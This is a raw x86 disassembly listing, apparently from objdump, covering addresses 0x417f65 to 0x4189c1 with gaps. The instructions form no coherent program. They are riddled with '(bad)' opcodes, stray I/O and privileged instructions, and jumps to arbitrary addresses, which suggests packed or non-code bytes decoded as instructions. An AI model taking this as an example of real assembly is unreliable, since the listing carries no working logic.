  417f65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f66:	daa    
  417f67:	pop    edx
  417f68:	(bad)  [ebp-0x44d52af2]
	...
  417fd6:	(bad)  
  417fd7:	out    0xe6,al
  417fd9:	cmp    esp,esi
  417fdb:	cmp    edi,edi
  417fdd:	push   DWORD PTR [edx]
  417fdf:	xchg   edx,eax
  417fe0:	xor    al,bh
  417fe2:	aam    0xe4
  417fe4:	and    dh,ah
  417fe6:	add    al,BYTE PTR [bx+di]
  417fe9:	add    BYTE PTR [eax],al
  417feb:	add    DWORD PTR [eax],eax
  417fed:	add    dh,cl
  417fef:	dec    ebx
  417ff0:	xlat   BYTE PTR ds:[ebx]
  417ff1:	addr16 shl dh,cl
  417ff4:	mov    bh,0xd4
  417ff6:	dec    esp
  417ff7:	mov    edx,0x63c876f
  417ffc:	sub    ecx,DWORD PTR [ecx]
  417ffe:	rdmsr  
  418000:	int    0xe3
  418002:	imul   esp,DWORD PTR [ecx+0x3979bc7f],0xffffffe1
  418009:	ret    0xee42
  41800c:	imul   edi,DWORD PTR [esi+0x1f],0xffffff94
  418010:	add    esi,DWORD PTR [ebx]
  418012:	jbe    0x417ff1
  418014:	and    bh,BYTE PTR [edi+0x64]
  418017:	pop    edx
  418018:	jno    0x41808f
  41801a:	jp     0x418039
  41801c:	mov    eax,ds:0xc350e6e3
  418021:	into   
  418022:	mov    ds:0xfb12d141,eax
  418027:	xor    bh,BYTE PTR [ebx+0x48]
  41802a:	and    ebx,edx
  41802c:	add    al,BYTE PTR [eax]
  41802e:	dec    ecx
  41802f:	out    dx,eax
  418030:	pop    ss
  418031:	sbb    al,0x7c
  418033:	out    0x77,eax
  418035:	and    al,0xf3
  418037:	xchg   esp,eax
  418038:	in     al,dx
  418039:	cmp    BYTE PTR [ebx-0x499b2361],bl
  41803f:	arpl   bx,di
  418041:	cwde   
  418042:	mov    al,ds:0xe1e466fc
  418047:	push   edi
  418048:	sbb    DWORD PTR [ecx+0x5d64e6da],0x52
  41804f:	dec    ebp
  418050:	sbb    DWORD PTR [esi],esp
  418052:	outs   dx,BYTE PTR ds:[esi]
  418053:	cs mov ebp,0x3997d770
  418059:	sub    BYTE PTR [esi-0x23],ch
  41805c:	xchg   BYTE PTR [ebx],cl
  41805e:	outs   dx,DWORD PTR ds:[esi]
  41805f:	sbb    BYTE PTR [ebx-0x3d],ch
  418062:	loope  0x417ff0
  418064:	mov    edi,0x858a7ac9
  418069:	cwde   
  41806a:	push   0xde9c3296
  41806f:	pop    ds
  418070:	jmp    0x49cc569c
  418075:	mov    eax,ds:0x2f7b8eb5
  41807a:	(bad)  
  41807b:	in     eax,0xcf
  41807d:	push   eax
  41807e:	push   es
  41807f:	and    eax,ebx
  418081:	bound  ebx,QWORD PTR [ebp+eiz*1+0x4491e1a9]
  418088:	icebp  
  418089:	pushf  
  41808a:	test   BYTE PTR [ebx+0x101e2e4],dl
  418090:	and    ah,bh
  418092:	dec    BYTE PTR [ebx+0x34912987]
  418098:	sbb    eax,0x308fd186
  41809d:	dec    esi
  41809e:	jbe    0x4180c9
  4180a0:	mov    ch,0xea
  4180a2:	scas   al,BYTE PTR es:[edi]
  4180a3:	lock add DWORD PTR [edx+0x87420d8],ebp
  4180aa:	pop    ebp
  4180ab:	dec    esp
  4180ac:	pop    es
  4180ad:	pop    ss
  4180ae:	setl   BYTE PTR [ebp+0x204562b8]
  4180b5:	repnz enter 0x841e,0x17
  4180ba:	daa    
  4180bb:	xor    bh,bl
  4180bd:	lahf   
  4180be:	imul   ecx,ebx,0x7ad96aeb
  4180c4:	out    dx,al
  4180c5:	mov    eax,0xe5aa0a17
  4180ca:	lock sub al,0x43
  4180cd:	mov    ecx,0x1d4836ed
  4180d2:	arpl   WORD PTR [ebx-0x7f4feab],bp
  4180d8:	and    DWORD PTR [esi+0x58],0x53
  4180dc:	fwait
  4180dd:	sbb    edi,edi
  4180df:	pop    edx
  4180e0:	mov    al,0x38
  4180e2:	mov    ds:0xddd035b7,al
  4180e7:	push   cs
  4180e8:	dec    eax
  4180e9:	pop    DWORD PTR [ebx+eax*4-0x79]
  4180ed:	pop    edi
	...
  418156:	test   eax,0xff456b7e
  41815b:	push   ebp
  41815c:	scas   eax,DWORD PTR es:[edi]
  41815d:	(bad)  
  41815e:	mov    ds:0xe42fdebc,eax
  418163:	ins    BYTE PTR es:[edi],dx
  418164:	shr    ah,cl
  418166:	add    eax,DWORD PTR [bx+di]
  418169:	add    BYTE PTR [eax],al
  41816b:	add    DWORD PTR [eax],eax
  41816d:	add    BYTE PTR [ecx+0x26cd2f10],al
  418173:	adc    eax,0x62fadc5
  418178:	loope  0x4181f1
  41817a:	test   al,0x1e
  41817c:	aaa    
  41817d:	pop    ss
  41817e:	sbb    ebx,DWORD PTR [esi+0x3a]
  418181:	inc    ebp
  418182:	(bad)  
  418183:	ja     0x418165
  418185:	xor    bl,BYTE PTR [esi+0x7611fa77]
  41818b:	popf   
  41818c:	sub    BYTE PTR [edi-0xc],0x74
  418190:	xchg   edx,eax
  418191:	scas   eax,DWORD PTR es:[edi]
  418192:	sar    DWORD PTR [edi],0x73
  418195:	fldenv [ebp-0x2d]
  418198:	jl     0x4181cd
  41819a:	sbb    BYTE PTR [edi],dl
  41819c:	out    dx,al
  41819d:	ins    DWORD PTR es:[edi],dx
  41819e:	xchg   DWORD PTR [ebx],ecx
  4181a0:	int    0xdf
  4181a2:	shl    BYTE PTR [esi+edi*4],1
  4181a5:	push   ebx
  4181a6:	gs cwde 
  4181a8:	clc    
  4181a9:	cwde   
  4181aa:	addr16 push es
  4181ac:	ja     0x41820a
  4181ae:	mov    bh,0x6f
  4181b0:	jnp    0x418176
  4181b2:	inc    ecx
  4181b3:	sti    
  4181b4:	fs aad 0x16
  4181b7:	into   
  4181b8:	adc    eax,0xea564128
  4181bd:	iret   
  4181be:	mov    dh,0x1b
  4181c0:	sbb    al,0xfe
  4181c2:	xchg   esp,eax
  4181c3:	test   eax,0x63f65768
  4181c8:	xor    ah,cl
  4181ca:	addr16 pop es
  4181cc:	pusha  
  4181cd:	ins    BYTE PTR es:[edi],dx
  4181ce:	scas   eax,DWORD PTR es:[edi]
  4181cf:	dec    eax
  4181d0:	add    BYTE PTR [ebp+0x7e],0x55
  4181d4:	dec    ebx
  4181d5:	call   0x42351ef6
  4181da:	add    al,0x8
  4181dc:	stos   BYTE PTR es:[edi],al
  4181dd:	mov    dh,0xc3
  4181df:	dec    edx
  4181e0:	inc    esp
  4181e1:	add    cl,BYTE PTR [ecx-0x3d]
  4181e4:	(bad)  
  4181e6:	das    
  4181e7:	cmp    al,0xb3
  4181e9:	hlt    
  4181ea:	inc    ebx
  4181eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181ec:	adc    al,BYTE PTR [eax-0x4f8c6185]
  4181f2:	inc    eax
  4181f3:	pop    esi
  4181f4:	sub    ebp,DWORD PTR [edx]
  4181f6:	mov    ds:0xcee8ae9c,eax
  4181fb:	push   ebx
  4181fc:	sub    bh,ah
  4181fe:	sahf   
  4181ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418200:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418201:	pop    ebp
  418202:	mov    gs,WORD PTR [edi]
  418204:	repz in eax,0x34
  418207:	xchg   edx,eax
  418208:	inc    ebx
  418209:	fist   WORD PTR [edx+eax*2-0x186de8e7]
  418210:	pop    ecx
  418211:	cmp    eax,0xc027431f
  418216:	xchg   DWORD PTR [eax-0x19],ebp
  418219:	xchg   edi,eax
  41821a:	daa    
  41821b:	add    bh,dh
  41821d:	in     al,dx
  41821e:	mov    bh,0xa
  418220:	outs   dx,BYTE PTR ds:[esi]
  418221:	cld    
  418222:	adc    ah,BYTE PTR [eax-0x405e5c86]
  418228:	inc    esp
  418229:	pop    eax
  41822a:	lods   eax,DWORD PTR ds:[esi]
  41822b:	cmp    al,0xe
  41822d:	outs   dx,DWORD PTR ds:[esi]
  41822e:	lahf   
  41822f:	dec    esi
  418230:	in     al,dx
  418231:	es mov eax,0xea7b0318
  418237:	jnp    0x418259
  418239:	cmc    
  41823a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41823b:	fdivr  QWORD PTR [eax]
  41823d:	test   BYTE PTR [edi-0x7b],0x26
  418241:	cwde   
  418242:	sbb    BYTE PTR [esi],dh
  418244:	mov    WORD PTR [ebp+0x73],cs
  418247:	inc    edx
  418248:	dec    ebp
  418249:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41824b:	push   esi
  41824c:	cwde   
  41824d:	add    al,0x6
  41824f:	xchg   edx,eax
  418250:	stc    
  418251:	mov    ah,0xec
  418253:	jne    0x4181ec
  418255:	je     0x41824b
  418257:	adc    eax,0x303f56f6
  41825c:	enter  0xb4d2,0x40
  418260:	dec    edx
  418261:	repz rcl DWORD PTR [eax+0x41],1
  418265:	or     al,0xee
  418267:	dec    esp
  418268:	shr    ebx,1
  41826a:	xchg   ecx,eax
  41826b:	inc    eax
  41826c:	out    dx,eax
  41826d:	jo     0x41826f
	...
  4182d3:	add    BYTE PTR [eax],al
  4182d5:	add    BYTE PTR [edi],dh
  4182d7:	xchg   edx,eax
  4182d8:	and    al,0x83
  4182da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182db:	mov    bh,0xb7
  4182dd:	mov    dh,0x40
  4182df:	mov    ebx,0x947db8d6
  4182e4:	ss aas 
  4182e6:	addr16 add al,0x1
  4182e9:	add    BYTE PTR [eax],al
  4182eb:	add    DWORD PTR [eax],eax
  4182ed:	add    BYTE PTR [ecx],bl
  4182ef:	jb     0x4182ce
  4182f1:	es mov cl,0xbf
  4182f4:	(bad)  
  4182f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4182f6:	bound  ebp,QWORD PTR ds:0x7b8aa085
  4182fc:	cmp    esi,ecx
  4182fe:	into   
  4182ff:	call   0x103307ee
  418304:	add    al,0xbd
  418306:	adc    eax,0x16f04122
  41830b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41830c:	push   esp
  41830d:	retf   0xea85
  418310:	es addr16 (bad) 
  418313:	xchg   ebx,eax
  418314:	jmp    0x11706b56
  418319:	mov    ds:0x6cdb146a,al
  41831e:	fcomp  DWORD PTR [esi-0x80]
  418321:	mov    dl,0x69
  418323:	loop   0x4182bc
  418325:	xchg   esi,eax
  418326:	arpl   WORD PTR [edx],di
  418328:	add    edx,DWORD PTR [edx]
  41832a:	ret    
  41832b:	jecxz  0x4183a1
  41832d:	daa    
  41832e:	xor    esp,esp
  418330:	push   cs
  418331:	out    dx,eax
  418332:	aaa    
  418333:	pop    es
  418334:	dec    ecx
  418335:	jl     0x418398
  418337:	inc    ebx
  418338:	or     ebp,ebp
  41833a:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41833c:	jmp    0x418348
  41833e:	cmp    BYTE PTR [edx],dh
  418340:	js     0x41839c
  418342:	adc    eax,0x4215545a
  418347:	dec    edx
  418348:	push   esp
  418349:	mov    ah,BYTE PTR [edi-0x3916c682]
  41834f:	sbb    edx,ebx
  418351:	cmp    esi,DWORD PTR [edx]
  418353:	push   ebp
  418354:	fnsave [ebx]
  418356:	mov    bl,0xef
  418358:	inc    esi
  418359:	sub    DWORD PTR [esi],ebp
  41835b:	xor    al,BYTE PTR [esp+edx*4]
  41835e:	addr16 cmp esi,esp
  418361:	stos   BYTE PTR es:[edi],al
  418362:	dec    ecx
  418363:	inc    edx
  418364:	and    DWORD PTR [ecx+0x40ef1f22],edx
  41836a:	mov    eax,0xa0a6ee98
  41836f:	mov    dh,dl
  418371:	push   ds
  418372:	jmp    0xb8495fa6
  418377:	dec    edi
  418378:	outs   dx,BYTE PTR ds:[esi]
  418379:	mov    dh,0x3d
  41837b:	outs   dx,DWORD PTR ds:[esi]
  41837c:	pop    esi
  41837d:	scas   eax,DWORD PTR es:[edi]
  41837e:	retf   
  41837f:	mov    esi,0x7ed040d4
  418384:	int3   
  418385:	jp     0x4183bb
  418387:	cmp    ebx,DWORD PTR [ecx-0x78d2cb18]
  41838d:	adc    eax,0xacf3b337
  418392:	comiss xmm5,DWORD PTR [ecx+ebp*1+0x6f]
  418397:	pop    ebp
  418398:	jmp    0x5ea35f19
  41839d:	mov    ah,0xde
  41839f:	add    al,0xc9
  4183a1:	dec    ebp
  4183a2:	mov    edi,0xcc97baa3
  4183a7:	adc    esi,DWORD PTR ds:0xba5bc2fc
  4183ad:	fcomp  DWORD PTR [edx-0x26]
  4183b0:	retf   0xfcbd
  4183b3:	pusha  
  4183b4:	sbb    DWORD PTR [ebx+esi*4],edx
  4183b7:	adc    DWORD PTR [esi+eax*8],edx
  4183ba:	pop    ebx
  4183bb:	enter  0x699d,0x88
  4183bf:	pop    ebx
  4183c0:	and    ebp,eax
  4183c2:	nop
  4183c3:	add    eax,0x20d360ed
  4183c8:	popa   
  4183c9:	push   ebp
  4183ca:	xor    DWORD PTR [edx],esp
  4183cc:	dec    BYTE PTR [eax+0x67]
  4183cf:	mov    ?,WORD PTR [ebp+0x68]
  4183d2:	add    edi,0x6e
  4183d5:	neg    DWORD PTR [esi+eax*8-0xfdadeb6]
  4183dc:	add    DWORD PTR [esi+0x534aed55],ebx
  4183e2:	in     eax,0xc3
  4183e4:	(bad)  
  4183e5:	in     eax,dx
  4183e6:	popa   
  4183e7:	neg    dl
  4183e9:	test   BYTE PTR [edi],dl
  4183eb:	mov    bl,0x7d
  4183ed:	adc    al,0x0
	...
  418453:	add    BYTE PTR [eax],al
  418455:	add    ah,bl
  418457:	mov    bl,0x3f
  418459:	push   eax
  41845a:	jg     0x418438
  41845c:	(bad)  
  41845d:	mov    edi,0x14d871ac
  418462:	popa   
  418463:	xlat   BYTE PTR ds:[ebx]
  418464:	iret   
  418465:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418466:	addr16 add eax,0x1000001
  41846c:	add    BYTE PTR [eax],al
  41846e:	jle    0x4183fb
  418470:	cmp    eax,0xecc7f278
  418475:	mov    esp,0xf9ef667c
  41847a:	pop    ds
  41847b:	jecxz  0x41847f
  41847d:	jecxz  0x4184d1
  41847f:	mov    es,WORD PTR [edx]
  418481:	shr    BYTE PTR [esi-0x10],cl
  418484:	pushf  
  418485:	fld    TBYTE PTR [ecx+0xa]
  418488:	dec    edx
  418489:	push   es
  41848a:	(bad)  [edx-0x6d]
  41848d:	xor    dh,dl
  41848f:	fmul   st(7),st
  418491:	adc    DWORD PTR [edi],ebp
  418493:	dec    ebp
  418494:	outs   dx,DWORD PTR ds:[esi]
  418495:	jb     0x4184e5
  418497:	(bad)  
  418498:	xor    eax,0x8d26b454
  41849d:	add    eax,0xb3fbf52e
  4184a2:	(bad)  
  4184a4:	xor    eax,0xc8c09bee
  4184a9:	add    ecx,DWORD PTR [ecx+0x4c]
  4184ac:	imul   esp,DWORD PTR [esi],0xffffffee
  4184af:	and    ebx,edi
  4184b1:	mov    ebx,0xd507f3f9
  4184b6:	jecxz  0x4184d0
  4184b8:	stos   BYTE PTR es:[edi],al
  4184b9:	pushf  
  4184ba:	xchg   BYTE PTR [ebx-0x6ce1a95f],ch
  4184c0:	xchg   esp,eax
  4184c1:	cmp    al,0x2b
  4184c3:	mov    ch,0xa7
  4184c5:	push   ds
  4184c6:	jns    0x4184e9
  4184c8:	(bad)  
  4184c9:	jg     0x418528
  4184cb:	mov    ebp,DWORD PTR [eax]
  4184cd:	adc    al,BYTE PTR [edx]
  4184cf:	fimul  WORD PTR [edi-0x6255794e]
  4184d5:	mov    edi,0x438fff83
  4184da:	(bad)  
  4184db:	in     eax,dx
  4184dc:	pop    esi
  4184dd:	(bad)  
  4184de:	jns    0x4184d3
  4184e0:	pop    ebp
  4184e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184e2:	dec    edx
  4184e3:	sbb    esp,ebp
  4184e5:	jg     0x4184db
  4184e7:	sar    BYTE PTR [edx+edx*1-0x685689ee],cl
  4184ee:	pop    esp
  4184ef:	or     BYTE PTR [esi-0x610ed494],0x4b
  4184f6:	mov    eax,ds:0x38da47ab
  4184fb:	das    
  4184fc:	pop    ss
  4184fd:	fmul   DWORD PTR [eax+0x3a1a5109]
  418503:	nop
  418504:	stos   DWORD PTR es:[edi],eax
  418505:	outs   dx,BYTE PTR ds:[esi]
  418506:	cli    
  418507:	cli    
  418508:	xchg   edi,eax
  418509:	out    0xfe,al
  41850b:	push   esp
  41850c:	daa    
  41850d:	arpl   WORD PTR [esi-0x458a3676],bp
  418513:	ja     0x418507
  418515:	iret   
  418516:	jg     0x4184f1
  418518:	shl    DWORD PTR ds:0xa77c5599,cl
  41851e:	mov    DWORD PTR [eax+0x5f],eax
  418521:	sbb    eax,0x8952311e
  418526:	popf   
  418527:	fbstp  TBYTE PTR [eax+0x6c]
  41852a:	dec    esi
  41852b:	ds (bad) 
  41852d:	and    edi,ecx
  41852f:	mov    ecx,ebx
  418531:	jecxz  0x4184d5
  418533:	pop    ebx
  418534:	adc    ch,BYTE PTR [ebp+0x32]
  418537:	pop    ebx
  418538:	xchg   ebx,eax
  418539:	fs ins BYTE PTR es:[edi],dx
  41853b:	test   al,0x1a
  41853d:	cld    
  41853e:	(bad)  
  41853f:	or     cl,BYTE PTR [edx+eax*1+0x35b52d26]
  418546:	imul   ebx,ecx,0x212c65f0
  41854c:	mov    DWORD PTR ds:0x24488a90,ebx
  418552:	push   esp
  418553:	jmp    FWORD PTR [edx-0x745605f9]
  418559:	jnp    0x4184dd
  41855b:	jmp    0x84ff:0xec44f1a0
  418562:	(bad)  
  418563:	xchg   ecx,eax
  418564:	mov    al,ds:0xfedb1e00
  418569:	sbb    al,0xac
  41856b:	push   ecx
  41856c:	pop    edi
  41856d:	xlat   BYTE PTR ds:[ebx]
	...
  4185d6:	inc    ecx
  4185d7:	stc    
  4185d8:	mov    ebx,ebx
  4185da:	mov    ebx,0x26fb51fb
  4185df:	lods   al,BYTE PTR ds:[esi]
  4185e0:	imul   dl
  4185e2:	or     eax,0x67cdb4e3
  4185e7:	push   es
  4185e8:	add    DWORD PTR [eax],eax
  4185ea:	add    BYTE PTR [ecx],al
  4185ec:	add    BYTE PTR [eax],al
  4185ee:	mov    esi,0xb8ada605
  4185f3:	xor    eax,0x79748b7b
  4185f8:	push   esi
  4185f9:	lds    eax,FWORD PTR [edx]
  4185fb:	lods   eax,DWORD PTR ds:[esi]
  4185fc:	mov    al,ds:0x7c31c326
  418601:	fidiv  WORD PTR ds:0x4c0824b9
  418607:	shr    DWORD PTR [ecx-0x2],1
  41860a:	fcom   QWORD PTR [edx+0x48af9f79]
  418610:	pop    edi
  418611:	fdivr  st,st(6)
  418613:	stos   DWORD PTR es:[edi],eax
  418614:	mov    WORD PTR [edi+0x3],cs
  418617:	dec    esp
  418618:	sbb    bl,BYTE PTR [edx-0x1953c3e7]
  41861e:	mov    edi,0xa007f68e
  418623:	xlat   BYTE PTR ds:[ebx]
  418624:	scas   al,BYTE PTR es:[edi]
  418625:	pop    ecx
  418626:	sahf   
  418627:	out    0xba,eax
  418629:	cdq    
  41862a:	outs   dx,DWORD PTR ds:[esi]
  41862b:	mov    eax,0x363b2944
  418630:	(bad)  
  418631:	jge    0x41866e
  418633:	xchg   ecx,eax
  418634:	push   ss
  418635:	dec    eax
  418636:	or     al,0x1d
  418638:	mov    edx,0x17d7ec1
  41863d:	aam    0xa3
  41863f:	xor    bh,BYTE PTR [edx]
  418641:	push   0x68
  418643:	mov    esp,0x182b2bb7
  418648:	addr16 push esp
  41864a:	ins    DWORD PTR es:[edi],dx
  41864b:	sbb    eax,0x506056dd
  418650:	inc    eax
  418651:	out    0xeb,al
  418653:	mov    cl,BYTE PTR [edx+0x18]
  418656:	mov    al,0x46
  418658:	icebp  
  418659:	int3   
  41865a:	lds    eax,FWORD PTR [edi-0x37dee2e0]
  418660:	fstp   QWORD PTR [ebx+esi*8-0x6ce10ff9]
  418667:	mov    ebp,0x61affe67
  41866c:	arpl   WORD PTR [esi-0x69b259d3],si
  418672:	out    dx,eax
  418673:	inc    edx
  418674:	into   
  418675:	out    dx,al
  418676:	sbb    eax,0xe30aced5
  41867b:	sbb    ecx,DWORD PTR [edx+0x204ed5ab]
  418681:	(bad)  
  418682:	mov    ebp,0xf1568bb1
  418687:	push   0xbdb8256a
  41868c:	pop    ebx
  41868d:	mov    ebx,0x419dd2ae
  418692:	lods   eax,DWORD PTR ds:[esi]
  418693:	test   BYTE PTR [esi+0x74],ch
  418696:	pop    ebp
  418697:	je     0x4186f9
  418699:	je     0x4186b6
  41869b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41869c:	pusha  
  41869d:	jo     0x418702
  41869f:	xchg   ebp,eax
  4186a0:	pop    es
  4186a1:	inc    ebp
  4186a2:	aam    0x32
  4186a4:	out    0xec,al
  4186a6:	cmp    esp,DWORD PTR [ebp+eax*2-0x50bc2ce1]
  4186ad:	imul   ebx
  4186af:	mov    BYTE PTR [ebx],0x11
  4186b2:	sub    eax,0x51db04
  4186b7:	loope  0x4186b6
  4186b9:	lahf   
  4186ba:	stos   DWORD PTR es:[edi],eax
  4186bb:	add    bl,BYTE PTR [esi+0x3adbb589]
  4186c1:	xor    al,0xcf
  4186c3:	xor    al,0x91
  4186c5:	fs (bad) 
  4186c7:	out    dx,eax
  4186c8:	jp     0x4186c2
  4186ca:	push   0x73
  4186cc:	leave  
  4186cd:	inc    eax
  4186ce:	dec    ecx
  4186cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186d0:	bnd jbe 0x418723
  4186d3:	xlat   BYTE PTR ds:[ebx]
  4186d4:	cmp    ecx,eax
  4186d6:	fisttp QWORD PTR [ecx+0x1a]
  4186d9:	dec    esi
  4186da:	inc    esp
  4186db:	(bad)
  4186df:	fs mov ebx,edx
  4186e2:	jae    0x418702
  4186e4:	pop    ebp
  4186e5:	jo     0x418673
  4186e7:	(bad)  
  4186e8:	out    dx,al
  4186e9:	xor    BYTE PTR [ebx-0x51],dh
  4186ec:	cmp    ch,BYTE PTR [edx+0x0]
	...
  418753:	add    BYTE PTR [eax],al
  418755:	add    BYTE PTR [ebx-0x44c35fd8],dl
  41875b:	mov    esp,0x8d0caf9f
  418760:	cmp    edx,edx
  418762:	popf   
  418763:	push   ss
  418764:	mov    ds:0x10767d6,al
  418769:	add    BYTE PTR [eax],al
  41876b:	add    DWORD PTR [eax],eax
  41876d:	add    BYTE PTR ds:0x46309548,cl
  418773:	xor    DWORD PTR [ebp-0x4d],0xc8808c84
  41877a:	sub    al,0xea
  41877c:	mov    cl,0xad
  41877e:	in     al,dx
  41877f:	out    0xa7,al
  418781:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418782:	mov    dl,0x6d
  418784:	mov    dh,0x99
  418786:	adc    BYTE PTR [esi+0x16],ah
  418789:	xchg   esi,eax
  41878a:	xlat   BYTE PTR ds:[ebx]
  41878b:	aaa    
  41878c:	aas    
  41878d:	or     DWORD PTR [edi],edx
  41878f:	mov    DWORD PTR ds:0xfa5de207,ebx
  418795:	hlt    
  418796:	and    ebx,esi
  418798:	jmp    0xd6ed:0xd57a9e3b
  41879f:	mov    bl,0x59
  4187a1:	add    ah,dh
  4187a3:	jae    0x4187c0
  4187a5:	sti    
  4187a6:	pusha  
  4187a7:	sti    
  4187a8:	repnz ins DWORD PTR es:[edi],dx
  4187aa:	inc    esi
  4187ab:	in     eax,dx
  4187ac:	outs   dx,DWORD PTR ds:[esi]
  4187ad:	push   eax
  4187ae:	pop    esi
  4187af:	nop
  4187b0:	fwait
  4187b1:	sti    
  4187b2:	push   edi
  4187b3:	pop    ebp
  4187b4:	aam    0x94
  4187b6:	mov    DWORD PTR es:[eax-0x79],ebx
  4187ba:	mov    edi,0xf127d3cd
  4187bf:	lock cmp ch,al
  4187c2:	sub    DWORD PTR [edx-0x36],eax
  4187c5:	(bad)  
  4187c6:	in     eax,dx
  4187c7:	fs sub eax,0xad354bd5
  4187cd:	add    esp,ebp
  4187cf:	fisubr WORD PTR [edx]
  4187d1:	jp     0x418779
  4187d3:	pop    edi
  4187d4:	mov    esi,0xbdf5a0f1
  4187d9:	lods   eax,DWORD PTR ds:[esi]
  4187da:	out    0xbc,eax
  4187dc:	in     al,dx
  4187dd:	mov    eax,0xe757ac9e
  4187e2:	xchg   edx,eax
  4187e3:	push   esp
  4187e4:	into   
  4187e5:	dec    eax
  4187e6:	mov    esp,0x3ab64044
  4187eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187ec:	jmp    0x9357:0xb79df757
  4187f3:	std    
  4187f4:	xor    al,0x4b
  4187f6:	dec    edx
  4187f7:	icebp  
  4187f8:	sub    al,0x0
  4187fa:	jae    0x41885d
  4187fc:	mov    bh,0xc9
  4187fe:	mov    ch,0xf0
  418800:	and    ch,al
  418802:	repz adc dh,BYTE PTR [ebp-0x10]
  418806:	sub    al,al
  418808:	daa    
  418809:	callw  0xc65d
  41880d:	sub    al,0xa2
  41880f:	sar    BYTE PTR [ecx+0x75],cl
  418812:	push   ecx
  418813:	mov    ch,0xb9
  418815:	enter  0x3839,0x47
  418819:	in     al,0xde
  41881b:	ss inc ebx
  41881d:	xor    al,0xa9
  41881f:	das    
  418820:	add    DWORD PTR [ebx+0x32],edx
  418823:	jecxz  0x41883e
  418825:	sub    ebx,DWORD PTR [edx]
  418827:	mov    bh,0xc2
  418829:	pop    ebx
  41882a:	mov    esi,0x6f13bb68
  41882f:	inc    esp
  418830:	mov    ebp,0x4b4e6dc9
  418835:	lea    eax,[ecx-0x4c]
  418838:	dec    DWORD PTR [edx]
  41883a:	(bad)  
  41883b:	fldenv [ebp+0x2218c73a]
  418841:	call   0x65e5d2bf
  418846:	xchg   edi,eax
  418847:	adc    DWORD PTR [ecx+0x78],edi
  41884a:	xor    DWORD PTR es:[ebp+0x56],esi
  41884e:	xor    al,0xb1
  418850:	ret    0xccb0
  418853:	sub    eax,0xd92107c6
  418858:	leave  
  418859:	mov    eax,ds:0xbcd38220
  41885e:	cli    
  41885f:	call   0xfbc1:0xd4eca0e0
  418866:	test   DWORD PTR [esi-0x5986a8bc],0xe7fd
	...
  4188d4:	add    BYTE PTR [eax],al
  4188d6:	xchg   esp,eax
  4188d7:	enter  0x4337,0x7f
  4188db:	push   esp
  4188dd:	fbld   TBYTE PTR [esi+0x5a9c3acd]
  4188e3:	rcl    DWORD PTR [edx+0x1086774],0x0
  4188ea:	add    BYTE PTR [ecx],al
  4188ec:	add    BYTE PTR [eax],al
  4188ee:	popf   
  4188ef:	cmp    eax,0xf48b8d9a
  4188f4:	aam    0xd8
  4188f6:	int    0x61
  4188f8:	sbb    eax,0x5e9f50a5
  4188fd:	xchg   esp,eax
  4188fe:	pop    ds
  4188ff:	loop   0x41890b
  418901:	imul   ecx,DWORD PTR [eax-0x470b1cea],0xca8fc673
  41890b:	(bad)  
  41890c:	into   
  41890d:	daa    
  41890e:	pop    esi
  41890f:	rol    BYTE PTR ds:0x4e629661,0xe2
  418916:	xchg   ebx,eax
  418917:	push   ecx
  418918:	xchg   edi,eax
  418919:	pop    eax
  41891a:	dec    esp
  41891b:	mov    BYTE PTR [eax+0x7b5cca73],bl
  418921:	add    ebx,edi
  418923:	loop   0x4188be
  418925:	call   0x59e60662
  41892a:	jno    0xb9a0f4c5
  418930:	xor    ebp,DWORD PTR [ecx-0x6fb042e1]
  418936:	pusha  
  418937:	pop    esp
  418938:	inc    eax
  418939:	sub    BYTE PTR [edi-0x36513f9c],ch
  41893f:	repnz cmp DWORD PTR [edx+0x7],esp
  418943:	fwait
  418944:	push   ebp
  418945:	sar    DWORD PTR ds:0x222a1d37,1
  41894b:	sub    al,0xe1
  41894d:	daa    
  41894e:	and    ecx,DWORD PTR [ebp+0x6f33b1c4]
  418954:	out    dx,eax
  418955:	or     edx,DWORD PTR [eax]
  418957:	jnp    0x4189c8
  418959:	mov    ch,0x50
  41895b:	fs mov ah,0x91
  41895e:	adc    al,0x5b
  418960:	(bad)  
  418962:	aam    0x15
  418964:	iret   
  418965:	or     al,0xe4
  418967:	(bad)  
  418968:	out    dx,al
  418969:	mov    edi,0xe44971c0
  41896e:	pop    ebp
  41896f:	fcmove st,st(1)
  418971:	cli    
  418972:	fldcw  WORD PTR [edi]
  418974:	out    dx,al
  418975:	pop    esp
  418976:	es xor ebp,ecx
  418979:	mov    dh,0x36
  41897b:	jl     0x41897b
  41897d:	dec    edx
  41897e:	fdivr  DWORD PTR [edx+0x61]
  418981:	dec    esi
  418982:	out    0xbd,al
  418984:	fcom   QWORD PTR [edi]
  418986:	test   DWORD PTR [ebx],edi
  418988:	pop    esi
  418989:	pop    ds
  41898a:	data16 jp 0x418972
  41898d:	(bad)  
  41898e:	pop    ss
  41898f:	ins    DWORD PTR es:[edi],dx
  418990:	and    al,BYTE PTR [ecx-0x46]
  418993:	loope  0x418924
  418995:	sbb    DWORD PTR [eax],ecx
  418997:	adc    ebp,esi
  418999:	or     al,0xe8
  41899b:	inc    ebp
  41899c:	push   ds
  41899d:	js     0x418944
  41899f:	gs es pusha 
  4189a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189a3:	sbb    ah,bl
  4189a5:	xchg   BYTE PTR [ecx-0x66e106f],al
  4189ab:	test   DWORD PTR [ebx+0x23],esi
  4189ae:	mov    ecx,0x437b67d7
  4189b3:	push   ss
  4189b4:	fs xchg esi,eax
  4189b6:	adc    DWORD PTR [eax-0x670bc255],ebx
  4189bc:	pop    ecx
  4189bd:	int    0xca
  4189bf:	addr16 push esi
  4189c1:	jno    0x4189ba
